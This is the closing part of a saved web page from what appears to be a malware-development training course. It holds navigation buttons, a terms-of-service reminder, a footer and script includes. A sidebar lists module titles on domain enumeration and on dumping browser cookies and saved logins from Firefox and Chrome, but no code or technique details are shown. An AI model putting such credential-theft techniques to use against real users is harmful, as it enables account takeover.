                <a data-target="_self" href="./78.html">
                    <div for="module-78" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 78 - Domain Enumeration Using MS-SAMR
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-79" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./79.html">
                    <div for="module-79" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 79 - Dumping Browser Cookies: Firefox
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-80" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./80.html">
                    <div for="module-80" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 80 - Dumping Saved Logins: Firefox
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-81" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./81.html">
                    <div for="module-81" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 81 - Dumping Browser Cookies: Chrome
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-82" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./82.html">
                    <div for="module-82" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 82 - Dumping Saved Logins: Chrome
                    </div>
                </a>
            </div>
                </div>
    </div>
</div>          </div>
      </div>

      
      <div class="flex">
  <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 border-r border-l border-gray-600/60 pl-4 pt-2 pb-2 rounded-bl-xl rounded-br-xl shadow-inner">

          <div class="mr-2">
        <a data-target="_self" href="./74.html">
          <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Previous</button>
        </a>
      </div>
    
    <div class="mr-2">
      <a data-target="_self" href="../All Modules.html">
        <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Modules</button>
      </a>
    </div>

    <div class="my-2 mr-2">
      <form id="complete-module" action="./75/complete" method="POST">
      </form>
      <form id="uncomplete-module" action="./7#" method="POST">
      </form>
    </div>

          <div class="mr-2">
        <a data-target="_self" href="./76.html">
          <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Next</button>
        </a>
      </div>
    
  </div>
</div>

      
      <input type="hidden" id="objectives-completed" value="20973">

      
      <div id="copyWarning" class="fixed inset-0 hidden z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm">
  <div class="relative bg-gray-800 border border-gray-600 rounded-2xl shadow-2xl p-8 max-w-lg w-11/12 text-center transform transition-all scale-100">
    <p class="text-2xl font-bold text-white mb-4 tracking-wide">
      Reminder
    </p>
    <p class="text-gray-300 text-base mb-6 leading-relaxed">
      To remain compliant with the Terms of Service, avoid copying the entire module and instead copy the necessary sections.
    </p>
    <button onclick="hideCopyWarning()" class="w-full text-white font-medium rounded-lg text-sm px-5 py-2.5 text-center transition-all duration-200 bg-blue-600/80 hover:bg-blue-500/80 border border-blue-400/40 backdrop-blur-sm backdrop-saturate-150">
      I understand
    </button>
    <span class="absolute top-3 right-3 text-gray-400 hover:text-gray-200 cursor-pointer text-xl" onclick="hideCopyWarning()"></span>
  </div>
</div>


      
        </div>

  <footer id="footer" class="text-gray-400
    bg-gradient-to-t from-[#101926] via-[#172130] to-[#1e293b] backdrop-blur-md backdrop-saturate-150 z-20 border-t border-gray-700/50 border-gray-800
     hidden body-font">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4"> 2025 Maldev Academy Inc.</p>
        <a href="https://x.com/maldevacademy" target="_blank" class="text-gray-500 hover:text-white ml-2 sm:mt-0 mt-4">
          <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 1200 1227" xmlns="http://www.w3.org/2000/svg" style="--darkreader-inline-fill: currentColor;" data-darkreader-inline-fill="">
            <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z" fill="white" style="--darkreader-inline-fill: var(--darkreader-text-ffffff, #e8e6e3);" data-darkreader-inline-fill=""></path>
          </svg>            
        </a>
        <a href="https://github.com/Maldev-Academy" target="_blank" class="text-gray-500 hover:text-white ml-2 sm:mt-0 mt-4">
          <svg class="w-6 h-6" fill="white" viewBox="0 0 24 24" aria-hidden="true" style="--darkreader-inline-fill: var(--darkreader-text-ffffff, #e8e6e3);" data-darkreader-inline-fill=""><path fill-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" clip-rule="evenodd"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
          Terms of Service
      </a></span><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
  </a></footer></div>
        

        <script src="75_files/jquery-3.6.0.min.js"></script>
        <script src="75_files/bootstrap.min.js"></script>
        <script src="75_files/navbar.js"></script>
        
<link rel="preload" as="style" href="75_files/app-BoiX-DPv.css"><link rel="modulepreload" href="75_files/app-D9jIIQde.js"><link rel="stylesheet" href="75_files/app-BoiX-DPv.css"><style class="darkreader darkreader--sync" media="screen"></style><script type="module" src="75_files/app-D9jIIQde.js"></script><script src="75_files/moduleviewer.js" defer="defer"></script>

</body></html>